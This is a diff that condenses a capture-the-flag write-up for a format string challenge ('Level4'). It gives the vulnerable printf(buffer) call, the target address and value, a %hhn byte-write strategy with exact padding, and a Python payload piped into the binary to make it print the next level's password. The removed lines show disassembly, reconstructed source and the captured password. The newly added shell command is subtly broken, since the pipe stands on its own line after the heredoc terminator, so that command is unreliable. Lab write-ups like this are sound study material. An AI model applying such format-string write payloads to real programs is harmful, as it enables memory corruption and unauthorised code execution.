@@ -1,126 +1,41 @@
 ## Level4 - Format String Vulnerability
-
-### Challenge Summary
-Binary reads 512 bytes from stdin, passes to printf() without format string validation, then checks a global variable for a specific value to trigger system("/bin/cat /home/user/level5/.pass").
+Binary reads 512 bytes, passes to printf(buffer) without validation. Must write 0x1025544 to address 0x8049810 to trigger system("/bin/cat /home/user/level5/.pass").
 
 ### Vulnerability
-- Function `p()` contains: `printf(buffer)` where buffer is user input
-- Format string vulnerability allowing arbitrary memory reads/writes
+- Function `p()`: printf(buffer) with user input (format string vulnerability)
+- Allows arbitrary memory reads/writes via format string specifiers
 
-### Target Objective
-Write value 0x1025544 to memory address 0x8049810
-- If this check passes: binary calls `system("/bin/cat /home/user/level5/.pass")`
-- If check fails: binary exits without executing system()
+### Target
+Write 0x1025544 to 0x8049810 (little-endian: 0x44 0x55 0x02 0x01)
 
-### Binary Analysis
-
-####  Key Assembly (function n):
-```asm
-8048460: mov    0x8049804,%eax          ; Load FP
-804845a: sub    $0x218,%esp             ; Allocate 512-byte buffer
-804847f: call   8048444 <p>             ; Call p(buffer)
-804848d: mov    0x8049810,%eax          ; Load check value from 0x8049810
-8048492: cmp    $0x1025544,%eax         ; Compare with 0x1025544
-8048497: jne    80484a5                 ; If not equal, skip system()
-8048499: call   8048360 <system@plt>    ; Call system() with "/bin/cat /home/user/level5/.pass"
-```
-
-### The Value 0x1025544
-
-This is the magic value that must be written to 0x8049810.
-
-In little-endian format (as stored in memory):
-- Bytes: 0x44 0x55 0x02 0x01
-- Decimal: 16930372
-
-### Exploitation Strategy: Byte-by-Byte Writes using %hhn
-
-**KEY INSIGHT**: Use %hhn (1-byte writes) instead of %hn (2-byte writes)!
-
-Breaking the 4-byte value into individual byte writes:
+### Exploitation: Byte-by-Byte Writes using %hhn
+Use %hhn (1-byte writes) instead of %hn (2-byte writes) to keep payload small:
 1. Write 0x44 (68 decimal) to 0x8049810 using %12$hhn
 2. Write 0x55 (85 decimal) to 0x8049811 using %13$hhn
 3. Write 0x0102 (258 decimal) to 0x8049812 using %14$hn
 
-**Why this works**:
-- %hhn writes 1 byte (character count mod 256)
-- %hn writes 2 bytes (character count mod 65536)
-- Character count ONLY INCREASES, so write in order: 68 < 85 < 258
-- Total payload is only ~278 bytes, fits in 512-byte fgets buffer
-
-### Payload Structure
-
-The working exploit uses three embedded addresses and carefully calculated padding:
-
+### Payload Structure (278 bytes total)
 ```
-[4 bytes: address 0x8049810]
-[4 bytes: address 0x8049811]
-[4 bytes: address 0x8049812]
-[56 bytes: 'A' padding]        Total: 68 bytes printed
-[6 bytes: '%12$hhn']           Write 0x44 (68) to 0x8049810
-[17 bytes: 'A' padding]        Total: 85 bytes printed
-[6 bytes: '%13$hhn']           Write 0x55 (85) to 0x8049811
-[173 bytes: 'A' padding]       Total: 258 bytes printed
-[6 bytes: '%14$hn']            Write 0x0102 (258) to 0x8049812
-[Total: 278 bytes]
+[12 bytes: 3 addresses at 0x8049810, 0x8049811, 0x8049812]
+[56 bytes: padding] > total 68, write %12$hhn
+[17 bytes: padding] > total 85, write %13$hhn
+[173 bytes: padding] > total 258, write %14$hn
 ```
 
 ### Execution
-
 ```bash
-python -c "import struct; s = struct.pack('<I', 0x8049810) + struct.pack('<I', 0x8049811) + struct.pack('<I', 0x8049812) + b'A'*56 + b'%12\$hhn' + b'A'*17 + b'%13\$hhn' + b'A'*173 + b'%14\$hn'; open('/tmp/payload.bin','wb').write(s)" && /home/user/level4/level4 < /tmp/payload.bin
+python3 << 'EOF'
+import struct
+payload = (struct.pack('<I', 0x8049810) + struct.pack('<I', 0x8049811) +
+           struct.pack('<I', 0x8049812) + b'A'*56 + b'%12$hhn' + b'A'*17 +
+           b'%13$hhn' + b'A'*173 + b'%14$hn')
+import sys; sys.stdout.buffer.write(payload)
+EOF
+ | /home/user/level4/level4
 ```
-
-### Result
-
-The exploit outputs the level 5 password when system() successfully executes:
-```
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
-```
-
-### Source Code Reconstruction
-
-```c
-void p(char *buffer) {
-    printf(buffer);  // FORMAT STRING VULNERABILITY
-}
-
-void n() {
-    char buffer[512];
-    fgets(buffer, sizeof(buffer), stdin);
-    p(buffer);
-
-    if (*(int *)0x8049810 == 0x1025544) {
-        system("/bin/cat /home/user/level5/.pass");
-    }
-}
-
-int main() {
-    n();
-    return 0;
-}
-```
-
-## Solution Summary
 
 ### Key Insights
-
-1. **Use %hhn (1-byte writes), not %hn**: Keeps payload small enough to fit in 512-byte buffer
-2. **Break value into 3 separate writes** instead of 2: 68, 85, 258 (much smaller byte counts)
-3. **Embed all three target addresses** at payload start (12 bytes total)
-4. **Calculate padding precisely** to reach each target byte count
-
-### Why This Works
-
-- %hhn writes only 1 byte, character count is much smaller (68 < 85 < 258)
-- All writes fit in 512-byte fgets buffer (total payload: 278 bytes)
-- Character count increases monotonically, no need for backward jumps
-
-### Verification
-
-**SUCCESSFULLY EXPLOITED**
-- Payload size: 278 bytes (fits in 512-byte fgets buffer)
-- All three writes execute successfully
-- Magic value 0x1025544 written to 0x8049810
-- system() call triggered and executes
-- **Level 5 Password**: `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
+- %hhn writes 1 byte (character count mod 256)
+- Character count must increase: 68 < 85 < 258 (no backward jumps)
+- Payload fits in 512-byte fgets buffer
+- All three writes execute successfully, magic value written, system() triggered
